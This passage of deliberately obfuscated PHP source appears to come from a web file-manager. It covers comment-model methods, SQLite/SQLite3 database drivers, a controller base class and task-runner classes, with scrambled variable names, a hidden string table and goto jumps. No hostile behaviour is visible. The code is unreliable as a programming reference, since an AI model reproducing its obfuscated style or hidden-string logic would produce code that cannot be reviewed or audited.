Model($¬á™Í­Û[556])->userListInfo($¬ áí¢ƒ); return $Ï¦êÎ; } public function remove($ÇÃõè˜Ô) { $Ğïä€« =& $_SERVER[íû‘ş´]; $•«£å² = array($Ğïä€«[1933] => $ÇÃõè˜Ô); $µô¤Ù’ = $this->where($•«£å²)->find(); if ($µô¤Ù’[$Ğïä€«[1932]]) { $this->where(array($Ğïä€«[1933] => $µô¤Ù’[$Ğïä€«[1932]]))->setAdd($Ğïä€«[1934], -1); } return $this->where($•«£å²)->delete(); } public function edit($’Í‘»‰, $ÓœÌ×Ù) { $ ‹çè­Ú =& $_SERVER[íû‘ş´]; $€§µ¼µÛ = array($ ‹çè­Ú[1933] => $’Í‘»‰); return $this->where($€§µ¼µÛ)->save(array($ ‹çè­Ú[1942] => $ÓœÌ×Ù)); } public function prasise($é‰™¾¨) { $¤¯ ¥¾á =& $_SERVER[íû‘ş´]; $Ó¤ê½ = Model($¤¯ ¥¾á[1943]); $Ç·Şˆ×Â = array($¤¯ ¥¾á[1933] => $é‰™¾¨, $¤¯ ¥¾á[1696] => USER_ID); $Ò´¥‡ñÇ = $Ó¤ê½->where($Ç·Şˆ×Â)->find(); if (!$Ò´¥‡ñÇ) { $Ó¤ê½->add($Ç·Şˆ×Â); $Áô¿õ® = $this->where(array($¤¯ ¥¾á[1933] => $é‰™¾¨))->setAdd($¤¯ ¥¾á[1935], 1); } else { $Ó¤ê½->where($Ç·Şˆ×Â)->delete(); $Áô¿õ® = $this->where(array($¤¯ ¥¾á[1933] => $é‰™¾¨))->setAdd($¤¯ ¥¾á[1935], -1); } return $Áô¿õ®; } public function targetInfo($˜ãŸêÂÜ, $İÅå®êı) { $çÅ ¼ô‡ =& $_SERVER[íû‘ş´]; $õİêŸ…Ö = array($çÅ ¼ô‡[626] => $˜ãŸêÂÜ, $çÅ ¼ô‡[627] => $İÅå®êı); $â“Ä¬‰ô = $this->where($õİêŸ…Ö)->count(); $ÕŞÂƒ» = "\122\x49\107\110\x54\x20\x4a\117\111\116\x20{$this->tablePrefix}\x63\x6f\155\155\x65\x6e\164\137\x70\x72\x61\x69\163\x65\x20\x73\164\141\x72\x20\x6f\156\40\x63\157\x6d\155\x65\156\164\x2e\x63\157\155\x6d\x65\x6e\x74\111\x44\40\x3d\40\x73\164\x61\162\x2e\x63\157\155\155\145\x6e\x74\111\104"; $œ¶€¦‘¦ = $this->alias($çÅ ¼ô‡[398])->where($õİêŸ…Ö)->join($ÕŞÂƒ», $çÅ ¼ô‡[1944])->count(); $şÜ—ÇİÃ = array($çÅ ¼ô‡[1945] => $â“Ä¬‰ô, $çÅ ¼ô‡[1946] => $œ¶€¦‘¦); return $şÜ—ÇİÃ; } public function listData($™´òıû¬) { $Î±ø©» =& $_SERVER[íû‘ş´]; if (isset($™´òıû¬[$Î±ø©»[1947]])) { if ($™´òıû¬[$Î±ø©»[1947]]) { $™´òıû¬[$Î±ø©»[1940]] = array($Î±ø©»[1072], intval($™´òıû¬[$Î±ø©»[1947]])); } unset($™´òıû¬[$Î±ø©»[1947]]); } if (isset($™´òıû¬[$Î±ø©»[1948]])) { if ($™´òıû¬[$Î±ø©»[1948]]) { $™´òıû¬[$Î±ø©»[1940]] = array($Î±ø©»[1069], intval($™´òıû¬[$Î±ø©»[1948]])); } unset($™´òıû¬[$Î±ø©»[1948]]); } return $this->_listData($™´òıû¬); } private function _listData($Óæ·‘ö) { $—½ä•Šü =& $_SERVER[íû‘ş´]; $¸ºİ¸ÖÁ = $this->where($Óæ·‘ö)->_makeOrder()->selectPage(100); $this->_listAppendParent($¸ºİ¸ÖÁ[$—½ä•Šü[413]]); $this->_listAppendUser($¸ºİ¸ÖÁ[$—½ä•Šü[413]]); $this->_listAppendMeta($¸ºİ¸ÖÁ[$—½ä•Šü[413]]); return $¸ºİ¸ÖÁ; } private function _makeOrder() { $›ˆËªÇ­ =& $_SERVER[íû‘ş´]; $¢»Ä£—Ë = array($›ˆËªÇ­[1935], $›ˆËªÇ­[1934], $›ˆËªÇ­[215]); $Ğ¬„Î³å = Input::get($›ˆËªÇ­[507], $›ˆËªÇ­[7], $›ˆËªÇ­[474], $¢»Ä£—Ë); $ßçÚâ¢Ò = Input::get($›ˆËªÇ­[508], $›ˆËªÇ­[7], $›ˆËªÇ­[1698], array($›ˆËªÇ­[1949], $›ˆËªÇ­[503])); $àè±ŞÔİ = $Ğ¬„Î³å . $›ˆËªÇ­[53] . $ßçÚâ¢Ò; return $this->order($àè±ŞÔİ); } private function _listAppendParent(&$Æõá±Ø) { $ë—ÚÍá§ =& $_SERVER[íû‘ş´]; $Âù¾ì“Õ = array_unique(array_to_keyvalue($Æõá±Ø, $ë—ÚÍá§[12], $ë—ÚÍá§[1932])); $Âù¾ì“Õ = array_remove_value($Âù¾ì“Õ, $ë—ÚÍá§[212]); if (!$Âù¾ì“Õ) { return; } $ÈÇ´Ãû = $this->where(array($ë—ÚÍá§[1933] => array($ë—ÚÍá§[7], $Âù¾ì“Õ)))->select(); $ÈÇ´Ãû = array_to_keyvalue($ÈÇ´Ãû, $ë—ÚÍá§[1940]); foreach ($Æõá±Ø as &$ê…ñø¾—) { if (isset($ÈÇ´Ãû[$ê…ñø¾—[$ë—ÚÍá§[1932]]])) { $ê…ñø¾—[$ë—ÚÍá§[1950]] = $ÈÇ´Ãû[$ê…ñø¾—[$ë—ÚÍá§[1932]]]; } } unset($ê…ñø¾—); } private function _listAppendUser(&$ôß‰­í’) { $é†¿’­â =& $_SERVER[íû‘ş´]; $‚øŸå·µ = array_unique(array_to_keyvalue($ôß‰­í’, $é†¿’­â[12], $é†¿’­â[1705])); $‚øŸå·µ = array_remove_value($‚øŸå·µ, $é†¿’­â[212]); if (count($‚øŸå·µ) == 0) { return; } foreach ($ôß‰­í’ as $„™áÇÂÇ) { if (isset($„™áÇÂÇ[$é†¿’­â[1950]])) { $‚øŸå·µ[] = $„™áÇÂÇ[$é†¿’­â[1950]][$é†¿’­â[1705]]; } } $Ç•ç²¼Á = Model($é†¿’­â[577])->userListInfo($‚øŸå·µ); foreach ($ôß‰­í’ as &$„™áÇÂÇ) { $„™áÇÂÇ[$é†¿’­â[640]] = $Ç•ç²¼Á[$„™áÇÂÇ[$é†¿’­â[1705]]]; if (isset($„™áÇÂÇ[$é†¿’­â[1950]])) { $„™áÇÂÇ[$é†¿’­â[1950]][$é†¿’­â[640]] = $Ç•ç²¼Á[$„™áÇÂÇ[$é†¿’­â[1950]][$é†¿’­â[1705]]]; } } unset($„™áÇÂÇ); } private function _listAppendMeta(&$ïˆ¢Ÿœº) { $ë‰ÇŒâø =& $_SERVER[íû‘ş´]; $íâê÷ÎÑ = array_unique(array_to_keyvalue($ïˆ¢Ÿœº, $ë‰ÇŒâø[12], $ë‰ÇŒâø[1940])); $íâê÷ÎÑ = array_remove_value($íâê÷ÎÑ, $ë‰ÇŒâø[212]); if (!$íâê÷ÎÑ) { return; } foreach ($ïˆ¢Ÿœº as $†”¯Œ©) { if (isset($†”¯Œ©[$ë‰ÇŒâø[1950]])) { $íâê÷ÎÑ[] = $†”¯Œ©[$ë‰ÇŒâø[1950]][$ë‰ÇŒâø[1940]]; } } $Ÿ„ÕÀËˆ = $this->metaList($íâê÷ÎÑ); if (!$Ÿ„ÕÀËˆ) { return !1; } foreach ($ïˆ¢Ÿœº as &$†”¯Œ©) { $†”¯Œ©[$ë‰ÇŒâø[516]] = $Ÿ„ÕÀËˆ[$†”¯Œ©[$ë‰ÇŒâø[1940]]]; if (isset($†”¯Œ©[$ë‰ÇŒâø[1950]])) { $†”¯Œ©[$ë‰ÇŒâø[1950]][$ë‰ÇŒâø[516]] = $Ÿ„ÕÀËˆ[$†”¯Œ©[$ë‰ÇŒâø[1950]][$ë‰ÇŒâø[1940]]]; } } unset($†”¯Œ©); } private function metaList($ÁÎ‡ÒÚÕ) { $®êş»ª =& $_SERVER[íû‘ş´]; if (!$ÁÎ‡ÒÚÕ) { return array(); } $Ø¸âÖ»™ = array($®êş»ª[1940] => array($®êş»ª[7], $ÁÎ‡ÒÚÕ)); $Ì•º¸œ³ = Model($®êş»ª[1951])->where($Ø¸âÖ»™)->select(); $Ì•º¸œ³ = array_to_keyvalue_group($Ì•º¸œ³, $®êş»ª[1940]); foreach ($Ì•º¸œ³ as $ÕïÃÎá => $¿ÍèÏ±) { $Ü¿Ì¯¸¤ = array(); foreach ($¿ÍèÏ± as $ÕÀè†º) { $Ü¿Ì¯¸¤[$ÕÀè†º[$®êş»ª[94]]] = $ÕÀè†º[$®êş»ª[418]]; } $Ì•º¸œ³[$ÕïÃÎá] = $Ü¿Ì¯¸¤; } return $Ì•º¸œ³ ? $Ì•º¸œ³ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\x66\x69\x6c\145\x5f\143\x6f\x6e\164\145\156\x74\x73"; protected $dataAuto = array(array("\143\162\x65\x61\x74\145\x54\x69\x6d\x65", "\x74\x69\155\x65", "\151\156\163\x65\x72\x74", "\x66\x75\x6e\143\164\151\157\156")); } goto f¥˜ÊÇ–Î; DçÚ×ãéÂ’: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $İïéí’÷ =& $_SERVER[íû‘ş´]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$İïéí’÷[6]] =& $config; $this->values[$İïéí’÷[7]] =& $in; $this->tpl = TEMPLATE . MOD . $İïéí’÷[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ìœ–“ıÒ) { if (1 === func_num_args()) { $this->{$ìœ–“ıÒ} = new $ìœ–“ıÒ(); } else { $ëâ«ê½” = new ReflectionClass($ìœ–“ıÒ); $Š½Š€•Ö = func_get_args(); array_shift($Š½Š€•Ö); $this->{$ìœ–“ıÒ} = $ëâ«ê½”->newInstanceArgs($Š½Š€•Ö); } return $this->{$ìœ–“ıÒ}; } public function routeBind($»ÖÈ™±, $®çİğÁ¦, $ß³Šİ¯¬ = 3) { $óàŒÜô¡ =& $_SERVER[íû‘ş´]; $Œôª€‰ = $this->in[$óàŒÜô¡[9]]; $»ÖÈ™± = str_replace($óàŒÜô¡[10], $óàŒÜô¡[11], trim(trim($»ÖÈ™±, $óàŒÜô¡[8]), $óàŒÜô¡[12])); if (!$»ÖÈ™± || count($Œôª€‰) <= $ß³Šİ¯¬) { return !1; } $µôŠ‡ê = !0; $ìº¿Õ–í = explode($óàŒÜô¡[8], $»ÖÈ™±); for ($æ˜¨ÔÀ = 0; $æ˜¨ÔÀ < count($ìº¿Õ–í); $æ˜¨ÔÀ++) { if ($ìº¿Õ–í[$æ˜¨ÔÀ] != $Œôª€‰[$ß³Šİ¯¬ + $æ˜¨ÔÀ]) { $µôŠ‡ê = !1; break; } } if (!$µôŠ‡ê) { return; } call_user_func_array(array($this, $®çİğÁ¦), array()); } public function routeArgs($ğğ¢ñ = 3) { $åäÎ‘€ø = $this->in[$_SERVER[íû‘ş´][9]]; if (count($åäÎ‘€ø) <= $ğğ¢ñ) { return array(); } $—ß×««„ = array(); for ($ÓÏÊ±¡ = $ğğ¢ñ; $ÓÏÊ±¡ < count($åäÎ‘€ø); $ÓÏÊ±¡ += 2) { $—ß×««„[$åäÎ‘€ø[$ÓÏÊ±¡]] = $åäÎ‘€ø[$ÓÏÊ±¡ + 1]; $this->in[$åäÎ‘€ø[$ÓÏÊ±¡]] = $åäÎ‘€ø[$ÓÏÊ±¡ + 1]; } return $—ß×««„; } protected function assign($ ³ñ…Ş¸, $¸’ı¯¤) { $this->values[$ ³ñ…Ş¸] = $¸’ı¯¤; } protected function display($Ã”º©÷¤) { ob_end_clean(); extract($this->values); require $this->tpl . $Ã”º©÷¤; } } class DbSqliteBase extends Db { public function __construct($’åÀ²Š¤ = '') { $»¿¹Ş·Ò =& $_SERVER[íû‘ş´]; if (!extension_loaded($»¿¹Ş·Ò[13])) { think_exception(think_lang($»¿¹Ş·Ò[14]) . $»¿¹Ş·Ò[15]); } if (!empty($’åÀ²Š¤)) { if (!isset($’åÀ²Š¤[$»¿¹Ş·Ò[16]])) { $’åÀ²Š¤[$»¿¹Ş·Ò[16]] = 438; } $this->config = $’åÀ²Š¤; if (empty($this->config[$»¿¹Ş·Ò[17]])) { $this->config[$»¿¹Ş·Ò[17]] = array(); } } } public function connect($õ‡ÇûêÑ = '', $€€Şí¹½ = 0) { $ÑÜ…š‡ú =& $_SERVER[íû‘ş´]; if (!isset($this->linkID[$€€Şí¹½])) { if (empty($õ‡ÇûêÑ)) { $õ‡ÇûêÑ = $this->config; } $óŒˆÛğ¥ = !empty($õ‡ÇûêÑ[$ÑÜ…š‡ú[17]][$ÑÜ…š‡ú[18]]) ? $õ‡ÇûêÑ[$ÑÜ…š‡ú[17]][$ÑÜ…š‡ú[18]] : $this->pconnect; $¤õÛ»·´ = $óŒˆÛğ¥ ? $ÑÜ…š‡ú[19] : $ÑÜ…š‡ú[20]; $this->linkID[$€€Şí¹½] = $¤õÛ»·´($õ‡ÇûêÑ[$ÑÜ…š‡ú[21]], $õ‡ÇûêÑ[$ÑÜ…š‡ú[16]]); if (!$this->linkID[$€€Şí¹½]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$€€Şí¹½], 30000); if (1 != think_config($ÑÜ…š‡ú[22])) { unset($this->config); } } return $this->linkID[$€€Şí¹½]; } public function free() { $this->queryID = null; } public function query($ÔÒëğô‹) { $Àü—¥×ü =& $_SERVER[íû‘ş´]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÔÒëğô‹; if ($this->queryID) { $this->free(); } think_action_status($Àü—¥×ü[23], 1); think_status($Àü—¥×ü[24]); $this->queryID = sqlite_query($this->_linkID, $ÔÒëğô‹); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Õº¦è¥ê = $this->getAll(); return $Õº¦è¥ê; } } public function execute($…ä·Ö¢Ú) { $Í†Éò¡ =& $_SERVER[íû‘ş´]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $…ä·Ö¢Ú; if ($this->queryID) { $this->free(); } think_action_status($Í†Éò¡[25], 1); think_status($Í†Éò¡[24]); $„âŒÄÏ¹ = sqlite_exec($this->_linkID, $…ä·Ö¢Ú); $this->debug(); if (!1 === $„âŒÄÏ¹) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[íû‘ş´][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $æü”üé = sqlite_query($this->_linkID, $_SERVER[íû‘ş´][27]); if (!$æü”üé) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $‡¿ˆş¨ = sqlite_query($this->_linkID, $_SERVER[íû‘ş´][28]); if (!$‡¿ˆş¨) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $İ¥åÕ·› = array(); if ($this->numRows > 0) { for ($ß†™ÄÄ” = 0; $ß†™ÄÄ” < $this->numRows; $ß†™ÄÄ”++) { $İ¥åÕ·›[$ß†™ÄÄ”] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $İ¥åÕ·›; } public function getFields($ö¤»éÚÀ) { $¡Ò¯®µÇ =& $_SERVER[íû‘ş´]; $¸€™úè = $this->query($¡Ò¯®µÇ[29] . $ö¤»éÚÀ . $¡Ò¯®µÇ[30]); $ñ ÂÏĞß = array(); if ($¸€™úè) { foreach ($¸€™úè as $ğû¡·Ù => $£ÌÂªä·) { $ñ ÂÏĞß[$£ÌÂªä·[$¡Ò¯®µÇ[31]]] = array($¡Ò¯®µÇ[32] => $£ÌÂªä·[$¡Ò¯®µÇ[31]], $¡Ò¯®µÇ[33] => $£ÌÂªä·[$¡Ò¯®µÇ[34]], $¡Ò¯®µÇ[35] => (bool) ($£ÌÂªä·[$¡Ò¯®µÇ[36]] === $¡Ò¯®µÇ[12]), $¡Ò¯®µÇ[37] => $£ÌÂªä·[$¡Ò¯®µÇ[38]], $¡Ò¯®µÇ[39] => strtolower($£ÌÂªä·[$¡Ò¯®µÇ[40]]) == $¡Ò¯®µÇ[41], $¡Ò¯®µÇ[42] => strtolower($£ÌÂªä·[$¡Ò¯®µÇ[43]]) == $¡Ò¯®µÇ[44]); } } return $ñ ÂÏĞß; } public function getTables($È¾ùı©Ä = '') { $ÀˆŸÒ»§ =& $_SERVER[íû‘ş´]; $×ÍâÈ”â = $this->query($ÀˆŸÒ»§[45] . $ÀˆŸÒ»§[46] . $ÀˆŸÒ»§[47]); $ŠÆÑ»­Ì = array(); foreach ($×ÍâÈ”â as $íÏÉä±´ => $Øì°ÆÆÂ) { $ŠÆÑ»­Ì[$íÏÉä±´] = current($Øì°ÆÆÂ); } return $ŠÆÑ»­Ì; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $õ«‚Â¾¡ =& $_SERVER[íû‘ş´]; $¬À¯‰…ş = sqlite_last_error($this->_linkID); $this->error = $¬À¯‰…ş . $õ«‚Â¾¡[4] . sqlite_error_string($¬À¯‰…ş); if ($õ«‚Â¾¡[12] != $this->queryStr) { $this->error .= LNG($õ«‚Â¾¡[48]) . $this->queryStr; } think_trace($this->error, $õ«‚Â¾¡[12], $õ«‚Â¾¡[49]); return $this->error; } public function escapeString($ì‹ªµø) { return sqlite_escape_string($ì‹ªµø); } public function parseLimit($†üÒÓ£Ä) { $¼íÍ‹‡Ì =& $_SERVER[íû‘ş´]; $éÕÔÇïÀ = $¼íÍ‹‡Ì[12]; if (!empty($†üÒÓ£Ä)) { $†üÒÓ£Ä = explode($¼íÍ‹‡Ì[50], $†üÒÓ£Ä); if (count($†üÒÓ£Ä) > 1) { $éÕÔÇïÀ .= $¼íÍ‹‡Ì[51] . $†üÒÓ£Ä[1] . $¼íÍ‹‡Ì[52] . $†üÒÓ£Ä[0] . $¼íÍ‹‡Ì[53]; } else { $éÕÔÇïÀ .= $¼íÍ‹‡Ì[51] . $†üÒÓ£Ä[0] . $¼íÍ‹‡Ì[53]; } } return $éÕÔÇïÀ; } } class DbSqlite3Base extends Db { public function __construct($ÂÖåªèÜ = '') { $¤üé  =& $_SERVER[íû‘ş´]; if (!class_exists($¤üé [54])) { think_exception(think_lang($¤üé [14]) . $¤üé [55]); } if (!empty($ÂÖåªèÜ)) { if (!isset($ÂÖåªèÜ[$¤üé [16]])) { $ÂÖåªèÜ[$¤üé [16]] = 438; } $this->config = $ÂÖåªèÜ; if (empty($this->config[$¤üé [17]])) { $this->config[$¤üé [17]] = array(); } } } public function connect($÷èÉ©õ = '', $ö¦Á±†Ú = 0) { $ãÜ’€È =& $_SERVER[íû‘ş´]; if (!isset($this->linkID[$ö¦Á±†Ú])) { if (empty($÷èÉ©õ)) { $÷èÉ©õ = $this->config; } $this->linkID[$ö¦Á±†Ú] = new SQLite3($÷èÉ©õ[$ãÜ’€È[21]]); if (!$this->linkID[$ö¦Á±†Ú]) { think_exception($this->linkID[$ö¦Á±†Ú]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ö¦Á±†Ú]->busyTimeout(30000); if (1 != think_config($ãÜ’€È[22])) { unset($this->config); } } return $this->linkID[$ö¦Á±†Ú]; } public function free() { $this->queryID = null; } public function query($‰—ä³±) { $—Ò‹Û¯ =& $_SERVER[íû‘ş´]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‰—ä³±; if ($this->queryID) { $this->free(); } think_action_status($—Ò‹Û¯[23], 1); think_status($—Ò‹Û¯[24]); $this->queryID = $this->_linkID->query($‰—ä³±); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Ü”ÉİüÌ = $this->getAll(); $this->numRows = count($Ü”ÉİüÌ); return $Ü”ÉİüÌ; } } public function execute($àËõµæ) { $‹Ü¦º­à =& $_SERVER[íû‘ş´]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $àËõµæ; if ($this->queryID) { $this->free(); } think_action_status($‹Ü¦º­à[25], 1); think_status($‹Ü¦º­à[24]); $™”¯äœ = $this->_linkID->exec($àËõµæ); $this->debug(); if (!1 === $™”¯äœ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[íû‘ş´][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $³ÎøÓİÕ = $this->_linkID->query($_SERVER[íû‘ş´][27]); if (!$³ÎøÓİÕ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $­ÌÑÆÖî = $this->_linkID->query($_SERVER[íû‘ş´][28]); if (!$­ÌÑÆÖî) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $šäˆœ·¸ = array(); while ($÷Š­Î½¾ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $šäˆœ·¸[] = $÷Š­Î½¾; } $this->queryID->reset(); return $šäˆœ·¸; } public function getFields($‚í¯‡Ô«) { $‹ØÌõ›™ =& $_SERVER[íû‘ş´]; $óö¸”ğ = $this->query($‹ØÌõ›™[29] . $‚í¯‡Ô« . $‹ØÌõ›™[30]); $×õÈõôà = array(); if ($óö¸”ğ) { foreach ($óö¸”ğ as $©Ïë·â  => $ÕüÊğ¢) { $×õÈõôà[$ÕüÊğ¢[$‹ØÌõ›™[32]]] = array($‹ØÌõ›™[32] => $ÕüÊğ¢[$‹ØÌõ›™[32]], $‹ØÌõ›™[33] => $ÕüÊğ¢[$‹ØÌõ›™[33]], $‹ØÌõ›™[35] => (bool) ($ÕüÊğ¢[$‹ØÌõ›™[35]] === $‹ØÌõ›™[12]), $‹ØÌõ›™[37] => $ÕüÊğ¢[$‹ØÌõ›™[56]], $‹ØÌõ›™[39] => (bool) $ÕüÊğ¢[$‹ØÌõ›™[57]], $‹ØÌõ›™[42] => (bool) $ÕüÊğ¢[$‹ØÌõ›™[57]]); } } return $×õÈõôà; } public function getTables($ÀÜÆÉÖ = '') { $Æİá­¹’ =& $_SERVER[íû‘ş´]; $æ£Ş½Ø = $this->query($Æİá­¹’[45] . $Æİá­¹’[46] . $Æİá­¹’[47]); $¾Ó‚í¨Ï = array(); foreach ($æ£Ş½Ø as $‰ÚŸ¾¸ => $Ñ½æÚ×Û) { $¾Ó‚í¨Ï[$‰ÚŸ¾¸] = current($Ñ½æÚ×Û); } return $¾Ó‚í¨Ï; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ö„ÔÀËâ =& $_SERVER[íû‘ş´]; $this->error = $this->_linkID->lastErrorMsg(); if ($ö„ÔÀËâ[12] != $this->queryStr) { $this->error .= LNG($ö„ÔÀËâ[48]) . $this->queryStr; } think_trace($this->error, $ö„ÔÀËâ[12], $ö„ÔÀËâ[49]); return $this->error; } public function escapeString($È¾û¤) { $Á–ùÒ› =& $_SERVER[íû‘ş´]; if ($this->_linkID) { return $this->_linkID->escapeString($È¾û¤); } return str_ireplace($Á–ùÒ›[58], $Á–ùÒ›[59], $È¾û¤); } public function parseLimit($¸Ûü®ƒæ) { $Š€ôï¸ =& $_SERVER[íû‘ş´]; $¯‰ƒ€» = $Š€ôï¸[12]; if (!empty($¸Ûü®ƒæ)) { $¸Ûü®ƒæ = explode($Š€ôï¸[50], $¸Ûü®ƒæ); if (count($¸Ûü®ƒæ) > 1) { $¯‰ƒ€» .= $Š€ôï¸[51] . $¸Ûü®ƒæ[1] . $Š€ôï¸[52] . $¸Ûü®ƒæ[0] . $Š€ôï¸[53]; } else { $¯‰ƒ€» .= $Š€ôï¸[51] . $¸Ûü®ƒæ[0] . $Š€ôï¸[53]; } } return $¯‰ƒ€»; } } goto B„¦·ÉÎäŒ; däÃ˜¸¡è: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($­øËÉàò, $ŸÉ´Ÿ›È = 5.0) { if (!$­øËÉàò) { return; } $à®ª¿Â = Cache::get($­øËÉàò); if (!$à®ª¿Â || timeFloat() - floatVal($à®ª¿Â) >= $ŸÉ´Ÿ›È) { Cache::set($­øËÉàò, timeFloat(), $ŸÉ´Ÿ›È * 10); return !0; } return !1; } public static function timeLimitCall($Ù³èäÏô, $õ˜–„²È, $‘ÆÔ²Êè, $ÂÚÒ¦¾Æ = 5.0) { $½–Ğ½—× =& $_SERVER[íû‘ş´]; if (!$Ù³èäÏô || !$õ˜–„²È) { return; } self::$asyncAdd = !0; $ûçÌ»™ = $½–Ğ½—×[1811]; $Û½Ùˆ°ƒ = Cache::get($ûçÌ»™, !0); $òŠŒ½‡ = array($½–Ğ½—×[1812] => timeFloat(), $½–Ğ½—×[1813] => timeFloat(), $½–Ğ½—×[308] => $õ˜–„²È, $½–Ğ½—×[1803] => $‘ÆÔ²Êè, $½–Ğ½—×[194] => $ÂÚÒ¦¾Æ); if (is_array($Û½Ùˆ°ƒ[$Ù³èäÏô])) { $òŠŒ½‡[$½–Ğ½—×[1813]] = $Û½Ùˆ°ƒ[$Ù³èäÏô][$½–Ğ½—×[1813]]; } if (is_array($Û½Ùˆ°ƒ[$Ù³èäÏô])) { if (timeFloat() - $Û½Ùˆ°ƒ[$Ù³èäÏô][$½–Ğ½—×[1812]] < $òŠŒ½‡[$½–Ğ½—×[194]] * 0.3) { return; } $òŠŒ½‡[$½–Ğ½—×[1813]] = $Û½Ùˆ°ƒ[$Ù³èäÏô][$½–Ğ½—×[1813]]; } $Û½Ùˆ°ƒ[$Ù³èäÏô] = $òŠŒ½‡; Cache::set($ûçÌ»™, $Û½Ùˆ°ƒ, 60); Cache::removeMemory($ûçÌ»™); write_log($½–Ğ½—×[1814] . $Ù³èäÏô . $½–Ğ½—×[71] . $õ˜–„²È, $½–Ğ½—×[185]); } public static function timeLimitCallLoop() { $¿¸üÂ¾Ş =& $_SERVER[íû‘ş´]; $„³İÛ®– = array($¿¸üÂ¾Ş[1815]); $¤ş½ä¯ï = in_array(strtolower(ACTION), $„³İÛ®–); if (!$¤ş½ä¯ï && !self::$asyncAdd) { return; } $¼Ö˜Š”½ = $¿¸üÂ¾Ş[1811]; $«³¾¸Â° = Cache::get($¼Ö˜Š”½, !0); if (!$«³¾¸Â° || count($«³¾¸Â°) <= 0) { return; } $ğÄõ¶“ = !1; $Ó²óÄª¤ = timeFloat(); $¥‹’Ÿ¨“ = array(); foreach ($«³¾¸Â° as $úîˆªÁ  => $ÊÛãûùö) { if ($Ó²óÄª¤ - $ÊÛãûùö[$¿¸üÂ¾Ş[1813]] > $ÊÛãûùö[$¿¸üÂ¾Ş[194]]) { $ğÄõ¶“ = !0; try { Hook::apply($ÊÛãûùö[$¿¸üÂ¾Ş[308]], $ÊÛãûùö[$¿¸üÂ¾Ş[1803]]); write_log($¿¸üÂ¾Ş[1816] . $úîˆªÁ  . $¿¸üÂ¾Ş[71] . $ÊÛãûùö[$¿¸üÂ¾Ş[308]] . $¿¸üÂ¾Ş[1817] . ACTION, $¿¸üÂ¾Ş[185]); } catch (Exception $ù­‹£) { } continue; } $¥‹’Ÿ¨“[$úîˆªÁ ] = $ÊÛãûùö; } if (!$ğÄõ¶“) { return; } if (!$¥‹’Ÿ¨“) { return Cache::remove($¼Ö˜Š”½); } Cache::set($¼Ö˜Š”½, $¥‹’Ÿ¨“, 60); Cache::removeMemory($¼Ö˜Š”½); } public static function finished($Ãåş‘êÄ, $ÊŠğé‘) { $Ï­Ğøäë =& $_SERVER[íû‘ş´]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Ï­Ğøäë[308] => $Ãåş‘êÄ, $Ï­Ğøäë[1803] => $ÊŠğé‘); } private static function finishedRun() { $Ÿ‘²üæã =& $_SERVER[íû‘ş´]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ÒÕáÄì¦) { try { Hook::apply($ÒÕáÄì¦[$Ÿ‘²üæã[308]], $ÒÕáÄì¦[$Ÿ‘²üæã[1803]]); } catch (Exception $’¬Òüë¬) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ïÄ¥Ãó‹ =& $_SERVER[íû‘ş´]; parent::startAfter(); Hook::bind($ïÄ¥Ãó‹[1818], array($this, $ïÄ¥Ãó‹[1819])); Hook::bind($ïÄ¥Ãó‹[1251], array($this, $ïÄ¥Ãó‹[1820])); Hook::bind($ïÄ¥Ãó‹[1821], array($this, $ïÄ¥Ãó‹[1822])); $ËüÑˆè« =& $this->task; $ËüÑˆè«[$ïÄ¥Ãó‹[1823]] = $ïÄ¥Ãó‹[1252]; if (!$ËüÑˆè«[$ïÄ¥Ãó‹[1599]]) { $ËüÑˆè«[$ïÄ¥Ãó‹[1599]] = LNG($ïÄ¥Ãó‹[1824]); } } protected function endAfter() { $¤ÕË„€è =& $_SERVER[íû‘ş´]; parent::endAfter(); Hook::unbind($¤ÕË„€è[1818], array($this, $¤ÕË„€è[1819])); Hook::unbind($¤ÕË„€è[1251], array($this, $¤ÕË„€è[1820])); Hook::unbind($¤ÕË„€è[1821], array($this, $¤ÕË„€è[1822])); } public function updateAfter() { $ãÊ¢İ®Ó =& $_SERVER[íû‘ş´]; $¥Ğ’ª˜ =& $this->task; if (!$¥Ğ’ª˜[$ãÊ¢İ®Ó[845]] || 